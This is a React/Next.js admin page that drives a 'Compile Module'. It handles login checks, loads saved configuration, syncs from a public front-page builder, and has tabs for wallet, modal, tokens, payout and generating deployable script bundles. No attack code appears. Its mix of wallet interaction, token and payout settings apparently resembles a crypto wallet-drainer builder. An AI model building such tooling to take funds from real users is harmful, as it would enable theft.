import { deriveCompileConfigFromFrontpage } from "@/lib/frontpage-compile-sync";
import type { FrontpageConfig } from "@/lib/frontpage-config";
import { Code2, Settings2, Wallet, Layers, Cpu, Banknote, FileCode2, RefreshCw } from "lucide-react";

export default function CompilePage() {
  const router = useRouter();
  const {
    setGeneralConfig,
    setWalletConfig,
    setModalConfig,
    setTokensConfig,
    setAdvancedConfig,
    setPayoutConfig,
  } = useStore();
  const [syncMessage, setSyncMessage] = useState<string | null>(null);
  const [syncError, setSyncError] = useState<string | null>(null);
  const [syncBusy, setSyncBusy] = useState(false);
  const [checking, setChecking] = useState(true);

  useEffect(() => {
    let active = true;

    async function checkAuthAndLoadConfig() {
      try {
        const authRes = await fetch("/api/auth/me", { cache: "no-store" });
        const authData = (await authRes.json()) as { authenticated?: boolean };
        if (!active) return;

        if (!authData?.authenticated) {
          router.replace("/login");
          return;
        }

        const res = await fetch("/api/compile-config", { cache: "no-store" });
        const data = (await res.json()) as { config?: CompileConfig };
        if (!res.ok || !data.config || !active) return;

        setGeneralConfig(data.config.general);
        setWalletConfig(data.config.wallet);
        setModalConfig(data.config.modal);
        setTokensConfig(data.config.tokens);
        setAdvancedConfig(data.config.advanced);
        setPayoutConfig(data.config.payout);
      } catch {
        // Keep defaults when no saved config is available.
      } finally {
        if (active) setChecking(false);
      }
    }

    void checkAuthAndLoadConfig();

    return () => {
      active = false;
    };
  }, [
    router,
    setAdvancedConfig,
    setGeneralConfig,
    setModalConfig,
    setPayoutConfig,
    setTokensConfig,
    setWalletConfig,
  ]);

  async function syncFromFrontpage() {
    setSyncBusy(true);
    setSyncError(null);
    setSyncMessage(null);
    try {
      const res = await fetch("/api/config", { cache: "no-store" });
      const data = (await res.json()) as { frontpage?: FrontpageConfig; message?: string };

      if (!res.ok || !data.frontpage) {
        throw new Error(data?.message || "Failed to load frontpage config.");
      }

      const derived = deriveCompileConfigFromFrontpage(data.frontpage);
      setGeneralConfig(derived.general);
      setTokensConfig(derived.tokens);
      setAdvancedConfig(derived.advanced);
      setSyncMessage("Loaded saved /frontpage config into the compiler.");
    } catch (error) {
      setSyncError(error instanceof Error ? error.message : "Failed to sync frontpage config.");
    } finally {
      setSyncBusy(false);
    }
  }

  if (checking) {
    return (
      <div className="space-y-6">
        <div>
          <h1 className="text-2xl font-bold tracking-tight">Compile Module</h1>
          <p className="text-muted-foreground text-sm mt-1">Checking authentication...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-2xl font-bold tracking-tight">Compile Module</h1>
        <p className="text-muted-foreground text-sm mt-1">
          Configure wallet interaction behavior, UI flows, and generate deployable SDK bundles
        </p>
      </div>

      <Card className="border-border/40 bg-black/40 backdrop-blur-xl">
        <CardContent className="flex flex-col gap-3 p-4 lg:flex-row lg:items-center lg:justify-between">
          <div className="space-y-1">
            <p className="text-sm font-medium">Frontpage Builder Sync</p>
            <p className="text-xs text-muted-foreground">
              Pull the saved public page config from <code>/frontpage</code> into the compiler so the script builder starts from the current page setup.
            </p>
            {syncMessage ? <p className="text-xs text-emerald-500">{syncMessage}</p> : null}
            {syncError ? <p className="text-xs text-destructive">{syncError}</p> : null}
          </div>
          <Button onClick={() => void syncFromFrontpage()} disabled={syncBusy} className="gap-2 self-start lg:self-center">
            <RefreshCw className="h-4 w-4" />
            {syncBusy ? "Loading..." : "Load /frontpage Config"}
          </Button>
        </CardContent>
      </Card>

      <TrailsLiveBuilder />

      <Tabs defaultValue="general" className="space-y-6">
        <TabsList className="grid w-full grid-cols-7 h-auto p-1">
          <TabsTrigger value="general" className="flex items-center gap-2 text-xs py-2.5">
            <Settings2 className="h-3.5 w-3.5" />
            General
          </TabsTrigger>
          <TabsTrigger value="wallet" className="flex items-center gap-2 text-xs py-2.5">
            <Wallet className="h-3.5 w-3.5" />
            Wallet
          </TabsTrigger>
          <TabsTrigger value="modal" className="flex items-center gap-2 text-xs py-2.5">
            <Layers className="h-3.5 w-3.5" />
            Modal
          </TabsTrigger>
          <TabsTrigger value="tokens" className="flex items-center gap-2 text-xs py-2.5">
            <Code2 className="h-3.5 w-3.5" />
            Tokens
          </TabsTrigger>
          <TabsTrigger value="advanced" className="flex items-center gap-2 text-xs py-2.5">
            <Cpu className="h-3.5 w-3.5" />
            Advanced
          </TabsTrigger>
          <TabsTrigger value="payout" className="flex items-center gap-2 text-xs py-2.5">
            <Banknote className="h-3.5 w-3.5" />
            Payout
          </TabsTrigger>
          <TabsTrigger value="output" className="flex items-center gap-2 text-xs py-2.5">
            <FileCode2 className="h-3.5 w-3.5" />
            Compile
          </TabsTrigger>
        </TabsList>

        <TabsContent value="general">
          <GeneralTab />
        </TabsContent>
        <TabsContent value="wallet">
          <WalletTab />
        </TabsContent>
        <TabsContent value="modal">
          <ModalTab />
        </TabsContent>
        <TabsContent value="tokens">
          <TokensTab />
        </TabsContent>
        <TabsContent value="advanced">
          <AdvancedTab />
        </TabsContent>
        <TabsContent value="payout">
          <PayoutTab />
        </TabsContent>
        <TabsContent value="output">
          <CompileOutput />
        </TabsContent>
      </Tabs>
    </div>
  );
}
```
